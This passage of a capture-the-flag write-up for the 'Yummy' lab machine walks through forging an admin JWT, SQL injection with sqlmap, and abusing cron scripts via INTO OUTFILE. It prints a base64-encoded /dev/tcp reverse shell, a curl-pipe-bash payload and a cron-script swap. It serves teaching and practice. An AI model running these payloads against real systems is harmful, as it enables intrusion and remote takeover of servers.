+		<span class="token string">"jwk"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
+			<span class="token string">"kty"</span><span class="token punctuation">:</span> <span class="token string">"RSA"</span><span class="token punctuation">,</span>
+			<span class="token string">"n"</span><span class="token punctuation">:</span> n<span class="token punctuation">,</span>
+			<span class="token string">"e"</span><span class="token punctuation">:</span> e
+		<span class="token punctuation">}</span>
+	<span class="token punctuation">}</span>
+
+	token <span class="token operator">=</span> gen_jwt<span class="token punctuation">(</span>data<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+	main<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780a9b2f7d09fd1fd96ea" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/1a30b98a88f780359bbbf6343401222f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> python jwt_forge.py &#x27;ch3ng@ch3ng.com&#x27;
+
+[+] Coprime pairs recovered!
+[+] p: 543161
+[+] q: 123391069088263744300500729347156568496347151248&lt;..SNIP..&gt;
+
+[+] Administrative JWT generated:
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImNoM2&lt;..SNIP..&gt;</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78018aeb3ccc2f3d99b8a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll add the token to my browser and reload. The app immediately redirects me to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/admindashboard</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f7807ca78ec3b2f4542329" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/yummy/admindashboard.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/yummy/admindashboard.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1a30b98a88f780c39e71f23ea6606070" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f7808791d3d3e3c2af8657" class="Divider"></div><h3 id="https://www.notion.so/1a30b98a88f78089b9e4f2f748559602" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1a30b98a88f78089b9e4f2f748559602"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Foothold:</span></span></h3><div id="https://www.notion.so/1a30b98a88f780f782dfdebb563bd899" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SQL Injection:</strong></span></span></p></div><div id="https://www.notion.so/1a30b98a88f78059856ce3bedce37500" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The dashboard simply shows a list of all bookings made, with a search function implemented. As previously identifieid by Snyk, the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">o</code></span><span class="SemanticString"> parameter is vulnerable to SQL injection.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780448fa7e61c510b4a34" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/yummy/admin_sqli.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/yummy/admin_sqli.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1a30b98a88f780849c76c2eb79bca748" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll leave </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sqlmap</code></span><span class="SemanticString"> to do the heavy lifting:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780c3bc93e28992383eb6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> sqlmap -u &#x27;http://yummy.htb/admindashboard?s=garcia&amp;o=ASC&#x27; -H &quot;Cookie: X-AUTH-Token=$(cat jwt)&quot; -p &#x27;o&#x27;  --tables --batch    
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9#stable}
+|_ -| . [(]     | .&#x27;| . |
+|___|_  [&#x27;]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 01:02:57 /2025-02-22/
+
+[01:02:57] [INFO] resuming back-end DBMS &#x27;mysql&#x27; 
+[01:02:57] [INFO] testing connection to the target URL
+&lt;.SNIP..&gt;
+Database: information_schema
+[79 tables]
++---------------------------------------+
+| ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
+| APPLICABLE_ROLES                      |
+| CHARACTER_SETS                        |
+| CHECK_CONSTRAINTS                     |
+&lt;..SNIP..&gt;
+| PLUGINS                               |
+| PROCESSLIST                           |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: performance_schema
+[8 tables]
++---------------------------------------+
+| processlist                           |
+| global_status                         |
+| global_variables                      |
+| persisted_variables                   |
+| session_account_connect_attrs         |
+| session_status                        |
+| session_variables                     |
+| variables_info                        |
++---------------------------------------+
+
+Database: yummy_db
+[2 tables]
++---------------------------------------+
+| appointments                          |
+| users                                 |
++---------------------------------------+
+
+
+[*] ending @ 01:04:20 /2025-02-22/</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78045bfecf8d0945782fa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">yummy_db</code></span><span class="SemanticString"> contains only two tables, with the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">users</code></span><span class="SemanticString"> table surprisingly empty. I’ve also checked for privileges, and found out that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">FILE</code></span><span class="SemanticString"> privilege is enabled.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f7803bb53edc886338fbe8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> sqlmap -u &#x27;http://yummy.htb/admindashboard?s=garcia&amp;o=ASC&#x27; -H &quot;Cookie: X-AUTH-Token=$(cat jwt)&quot; -p &#x27;o&#x27;  --privileges --batch              
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9#stable}
+|_ -| . [.]     | .&#x27;| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 01:11:32 /2025-02-22/
+
+[01:11:32] [INFO] resuming back-end DBMS &#x27;mysql&#x27; 
+[01:11:32] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: o (GET)
+    Type: boolean-based blind
+    Title: MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause
+    Payload: s=garcia&amp;o=ASC,(SELECT (CASE WHEN (4789=4789) THEN 1 ELSE 4789*(SELECT 4789 FROM INFORMATION_SCHEMA.PLUGINS) END))
+
+    Type: error-based
+    Title: MySQL &gt;= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)
+    Payload: s=garcia&amp;o=ASC,EXTRACTVALUE(3741,CONCAT(0x5c,0x716b716b71,(SELECT (ELT(3741=3741,1))),0x716b7a7171))
+
+    Type: stacked queries
+    Title: MySQL &gt;= 5.0.12 stacked queries (comment)
+    Payload: s=garcia&amp;o=ASC;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 time-based blind - ORDER BY, GROUP BY clause
+    Payload: s=garcia&amp;o=ASC,(SELECT (CASE WHEN (1048=1048) THEN SLEEP(5) ELSE 1048 END))
+---
+[01:11:32] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.0
+[01:11:32] [INFO] fetching database users privileges
+[01:11:33] [INFO] retrieved: &#x27;&#x27;chef&#x27;@&#x27;localhost&#x27;&#x27;
+[01:11:34] [INFO] retrieved: &#x27;FILE&#x27;
+database management system users privileges:
+[*] &#x27;chef&#x27;@&#x27;localhost&#x27; [1]:
+    privilege: FILE
+
+
+[*] ending @ 01:11:34 /2025-02-22/</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7801bb95ad6f68a42ce1f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This essentially allows writing to arbitrary files using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SELECT &quot;&lt;contents&gt;&quot; INTO OUTFILE &quot;&lt;filepath&gt;&quot;</code></span><span class="SemanticString">, providing the SQL user has write access in the target directory. However, unlike PHP servers, it’s not as easy as dropping a web shell in the web root. Creating a bash script is possible, but I’ll need to find a way to trigger it.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f78083bd7bf68c99054c2b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f78042bd2bf53ceda2aad7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">mysql</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"> Cron:</strong></span></span></p></div><div id="https://www.notion.so/1a30b98a88f7802a8aaff9adbf1d67cd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll have another look at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mysql</code></span><span class="SemanticString">&#x27;s per-minute cron job running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/data/scripts/dbmonitor.sh</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f7802b86b0d5c090b3ed31" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token shebang important">#!/bin/bash</span>
+
+<span class="token assign-left variable">timestamp</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>/usr/bin/date<span class="token variable">)</span></span>
+<span class="token assign-left variable">service</span><span class="token operator">=</span>mysql
+<span class="token assign-left variable">response</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>/usr/bin/systemctl is-active mysql<span class="token variable">)</span></span>
+
+<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$response</span>"</span> <span class="token operator">!=</span> <span class="token string">'active'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+    /usr/bin/echo <span class="token string">"{<span class="token entity" title="\&quot;">\"</span>status<span class="token entity" title="\&quot;">\"</span>: <span class="token entity" title="\&quot;">\"</span>The database is down<span class="token entity" title="\&quot;">\"</span>, <span class="token entity" title="\&quot;">\"</span>time<span class="token entity" title="\&quot;">\"</span>: <span class="token entity" title="\&quot;">\"</span><span class="token variable">$timestamp</span><span class="token entity" title="\&quot;">\"</span>}"</span> <span class="token operator">></span> /data/scripts/dbstatus.json
+    /usr/bin/echo <span class="token string">"<span class="token variable">$service</span> is down, restarting!!!"</span> <span class="token operator">|</span> /usr/bin/mail <span class="token parameter variable">-s</span> <span class="token string">"<span class="token variable">$service</span> is down!!!"</span> root
+    <span class="token assign-left variable">latest_version</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>/usr/bin/ls <span class="token parameter variable">-1</span> /data/scripts/fixer-v* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> /usr/bin/sort <span class="token parameter variable">-V</span> <span class="token operator">|</span> /usr/bin/tail <span class="token parameter variable">-n</span> <span class="token number">1</span><span class="token variable">)</span></span>
+    /bin/bash <span class="token string">"<span class="token variable">$latest_version</span>"</span>
+<span class="token keyword">else</span>
+    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /data/scripts/dbstatus.json <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+        <span class="token keyword">if</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> <span class="token string">"database is down"</span> /data/scripts/dbstatus.json <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span>
+            /usr/bin/echo <span class="token string">"The database was down at <span class="token variable">$timestamp</span>. Sending notification."</span>
+            /usr/bin/echo <span class="token string">"<span class="token variable">$service</span> was down at <span class="token variable">$timestamp</span> but came back up."</span> <span class="token operator">|</span> /usr/bin/mail <span class="token parameter variable">-s</span> <span class="token string">"<span class="token variable">$service</span> was down!"</span> root
+            /usr/bin/rm <span class="token parameter variable">-f</span> /data/scripts/dbstatus.json
+        <span class="token keyword">else</span>
+            /usr/bin/rm <span class="token parameter variable">-f</span> /data/scripts/dbstatus.json
+            /usr/bin/echo <span class="token string">"The automation failed in some way, attempting to fix it."</span>
+            <span class="token assign-left variable">latest_version</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>/usr/bin/ls <span class="token parameter variable">-1</span> /data/scripts/fixer-v* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> /usr/bin/sort <span class="token parameter variable">-V</span> <span class="token operator">|</span> /usr/bin/tail <span class="token parameter variable">-n</span> <span class="token number">1</span><span class="token variable">)</span></span>
+            /bin/bash <span class="token string">"<span class="token variable">$latest_version</span>"</span>
+        <span class="token keyword">fi</span>
+    <span class="token keyword">else</span>
+        /usr/bin/echo <span class="token string">"Response is OK."</span>
+    <span class="token keyword">fi</span>
+<span class="token keyword">fi</span>
+
+<span class="token punctuation">[</span> <span class="token parameter variable">-f</span> dbstatus.json <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> /usr/bin/rm <span class="token parameter variable">-f</span> dbstatus.json</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7803dabdac73262b59092" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The wildcard caught my attention. It’s grabbing the latest script in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/data/scripts/</code></span><span class="SemanticString"> that starts with “fixer-v” and executing it.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f7803eb245e65ae5e2a3bb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token assign-left variable">latest_version</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>/usr/bin/ls <span class="token parameter variable">-1</span> /data/scripts/fixer-v* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> /usr/bin/sort <span class="token parameter variable">-V</span> <span class="token operator">|</span> /usr/bin/tail <span class="token parameter variable">-n</span> <span class="token number">1</span><span class="token variable">)</span></span>
+/bin/bash <span class="token string">"<span class="token variable">$latest_version</span>"</span></span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7804aa72df409459a14e9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This possibly means arbitrary code execution if I can create file named </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">fixer-v_</code></span><span class="SemanticString"> in that directory and write into it. However, the command is nested in several </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">if-else</code></span><span class="SemanticString"> statements. The following conditions must be satisfied for that line to run:</span></span></p></div><ol class="NumberedListWrapper"><li id="https://www.notion.so/1a30b98a88f7801b840ee72ae80f9859" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">systemctl is-active mysql</code></span><span class="SemanticString"> must return “active”;</span></span></li><li id="https://www.notion.so/1a30b98a88f780298d73d58f097150ad" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/data/scripts/dbstatus.json</code></span><span class="SemanticString"> exists; and</span></span></li><li id="https://www.notion.so/1a30b98a88f780ddb17fd6f3ffb14c72" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/data/scripts/dbstatus.json</code></span><span class="SemanticString"> does not contain “database is down”.</span></span></li></ol><div id="https://www.notion.so/1a30b98a88f780d69e74e1fc1d66b338" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Point 1 is almost certainly true, and I can also satisfy points 2 and 3 by creating </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dbstatus.json</code></span><span class="SemanticString"> via SQL injection.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780c49384c6350794d3a8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll first set up an HTTP server hosting this reverse shell script:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780cb95f3fd3e5db963ce" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> cat rev.sh
+                                   
+#!/bin/bash
+
+echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI0LzgwMDEgMD4mMQ== | base64 -d | bash</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780bea0f5c0ab526e7fff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I’ll create the necessary files on the server with the following two </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> commands:</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780ab9f22e9bcd48bba34" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ curl -s -b &quot;X-AUTH-Token=$(cat jwt)&quot; &#x27;http://yummy.htb/admindashboard?s=garcia&amp;o=ASC;+SELECT+&quot;asdf&quot;+INTO+OUTFILE+&quot;/data/scripts/dbstatus.json&quot;;&#x27; &gt; /dev/null</code></span></span></p></div><div id="https://www.notion.so/1a30b98a88f7808ebd36dd37a07f6352" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f780a2995df5cace47efb3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ curl -s -b &quot;X-AUTH-Token=$(cat jwt)&quot; &#x27;http://yummy.htb/admindashboard?s=garcia&amp;o=ASC;+SELECT+&quot;curl+http://10.10.14.24:8000/rev.sh+|+bash;&quot;+INTO+OUTFILE+&quot;/data/scripts/fixer-v_&quot;;&#x27; &gt; /dev/null</code></span></span></p></div><div id="https://www.notion.so/1a30b98a88f780ad8264c59958d3aa6e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The fixer script and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dbstatus.json</code></span><span class="SemanticString"> should be created. After a short while, the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> listener caught a shell as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mysql</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780fe9160c508cc30f727" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.24] from (UNKNOWN) [10.129.195.30] 58998
+bash: cannot set terminal process group (10955): Inappropriate ioctl for device
+bash: no job control in this shell
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mysql@yummy:/var/spool/cron$</span></mark></span><span class="SemanticString"><span> id
+
+uid=110(mysql) gid=110(mysql) groups=110(mysql)</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7805f97c5f613712d756e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f780a4af72ca1bfdbefd3a" class="Divider"></div><h3 id="https://www.notion.so/1a30b98a88f78024a56cd83cf1afdf3e" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1a30b98a88f78024a56cd83cf1afdf3e"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mysql</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1a30b98a88f780aaa0bcd55143ff3f31" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">www-data</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"> Cron:</strong></span></span></p></div><div id="https://www.notion.so/1a30b98a88f7807abfffce0ce714ea85" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll once again revisit </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">www-data</code></span><span class="SemanticString">&#x27;s cron job. I’ve already leveraged it once to discover the source code backup.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f7806fb4a4def35ee87cce" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
+*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
+* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780aabaa2c16a50270fca" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Notably, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/data/scripts/</code></span><span class="SemanticString"> is globally writable. While I cannot directly edit </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">app_backup.sh</code></span><span class="SemanticString">, I can simply rename or delete it and create a reverse shell script with the same name.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f7806189e3c14e415718e7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mysql@yummy:/data/scripts$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 32
+drwxrwxrwx 2 root root 4096 Feb 21 16:20 .
+drwxr-xr-x 3 root root 4096 Sep 30 08:16 ..
+-rw-r--r-- 1 root root   90 Sep 26 15:31 app_backup.sh
+-rw-r--r-- 1 root root 1336 Sep 26 15:31 dbmonitor.sh
+-rw-r----- 1 root root   60 Feb 21 16:20 fixer-v1.0.1.sh
+-rw-r--r-- 1 root root 5570 Sep 26 15:31 sqlappointments.sql
+-rw-r--r-- 1 root root  114 Sep 26 15:31 table_cleanup.sh</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780bbac5cc9b33185b3ef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Here, I’ll simply replace </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">app_backup.sh</code></span><span class="SemanticString"> with the payload I used earlier:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78089bc7cf4920e483d21" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mysql@yummy:/data/scripts$</span></mark></span><span class="SemanticString"><span> wget http://10.10.14.24:8000/rev.sh
+
+--2025-02-21 16:28:52--  http://10.10.14.24:8000/rev.sh
+Connecting to 10.10.14.24:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 102 [text/x-sh]
+Saving to: ‘rev.sh’
+
+rev.sh              100%[===================&gt;]     102  --.-KB/s    in 0s      
+
+2025-02-21 16:28:52 (6.89 MB/s) - ‘rev.sh’ saved [102/102]
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mysql@yummy:/data/scripts$</span></mark></span><span class="SemanticString"><span> mv app_backup.sh app_backup_2.sh
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mysql@yummy:/data/scripts$</span></mark></span><span class="SemanticString"><span> mv rev.sh app_backup.sh
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mysql@yummy:/data/scripts$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 36
+drwxrwxrwx 2 root  root  4096 Feb 21 16:29 .
+drwxr-xr-x 3 root  root  4096 Sep 30 08:16 ..
+-rw-r--r-- 1 root  root    90 Sep 26 15:31 app_backup_2.sh
+-rw-rw-r-- 1 mysql mysql  102 Feb 21 16:00 app_backup.sh
+-rw-r--r-- 1 root  root  1336 Sep 26 15:31 dbmonitor.sh
+-rw-r----- 1 root  root    60 Feb 21 16:25 fixer-v1.0.1.sh
+-rw-r--r-- 1 root  root  5570 Sep 26 15:31 sqlappointments.sql
